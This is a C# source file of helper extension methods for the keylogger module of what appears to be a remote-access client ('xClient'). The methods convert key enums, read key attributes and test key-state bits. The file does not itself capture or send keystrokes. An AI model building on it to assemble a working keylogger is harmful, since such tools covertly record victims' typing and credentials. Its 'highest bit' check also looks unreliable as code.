using System;
using System.Collections.Generic;
using System.Text;
using System.Reflection;
using xClient.Core.Keylogger;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace xClient.Core.Keylogger
{
    /// <summary>
    /// Provides extension methods that are used to assist repetitive tasks that
    /// are done throughout the keylogging system.
    /// </summary>
    public static class KeyloggerHelpers
    {
        /// <summary>
        /// Extracts the byte representation of the specific key provided.
        /// </summary>
        /// <param name="sender">The keylogger key to obtain the byte data from.</param>
        /// <returns>Returns the byte representation of the key provided.</returns>
        public static byte GetKeyloggerKeyValue(this KeyloggerKeys sender)
        {
            return Convert.ToByte(sender);
        }

        /// <summary>
        /// Determines if the key provided is one that is considered to be
        /// special (non-character) and should be handled differently by the keylogger.
        /// </summary>
        /// <param name="sender">The keylogger key to decide upon.</param>
        /// <returns>True if the key is special; False if the key is not special.</returns>
        public static bool IsSpecialKey(this KeyloggerKeys sender)
        {
            try
            {
                FieldInfo fieldInfo = sender.GetType().GetField(sender.ToString());

                if (fieldInfo != null)
                {
                    KeyloggerKey[] keyloggerKeyAttributes = fieldInfo.GetCustomAttributes(typeof(KeyloggerKey), false) as KeyloggerKey[];

                    if (keyloggerKeyAttributes != null && keyloggerKeyAttributes.Length > 0)
                    {
                        return keyloggerKeyAttributes[0].IsSpecialKey;
                    }
                }

                return false;
            }
            catch
            {
                // The likely cause of this exception would be a lack of an attribute for the Keylogger Key.
                return false;
            }
        }

        /// <summary>
        /// Obtains the name, if one was given, of the key provided.
        /// </summary>
        /// <param name="sender">The keylogger key to obtain the name from.</param>
        /// <returns>Returns the name of the key that was explicitly provided, or string.Empty
        ///          if none was provided.</returns>
        public static string GetKeyloggerKeyName(this KeyloggerKeys sender)
        {
            try
            {
                FieldInfo fieldInfo = sender.GetType().GetField(sender.ToString());

                if (fieldInfo != null)
                {
                    KeyloggerKey[] keyloggerKeyAttributes = fieldInfo.GetCustomAttributes(typeof(KeyloggerKey), false) as KeyloggerKey[];

                    if (keyloggerKeyAttributes != null && keyloggerKeyAttributes.Length > 0)
                    {
                        return keyloggerKeyAttributes[0].KeyName;
                    }
                }

                return string.Empty;
            }
            catch
            {
                // The likely cause of this exception would be a lack of an attribute for the Keylogger Key.
                return string.Empty;
            }
        }

        /// <summary>
        /// Determines if the highest bit is set.
        /// </summary>
        /// <param name="sender">The code for the key.</param>
        /// <returns>True if the highest bit is set; False if the highest bit is not set.</returns>
        public static bool GetHighestBit(this short sender)
        {
            return (sender >> 7) != 0;
        }

        /// <summary>
        /// Determines if the lowest bit is set.
        /// </summary>
        /// <param name="sender">The code for the key.</param>
        /// <returns>True if the lowest bit is set; False if the lowest bit is not set.</returns>
        public static bool GetLowestBit(this short sender)
        {
            return (sender & 1) != 0;
        }
    }
}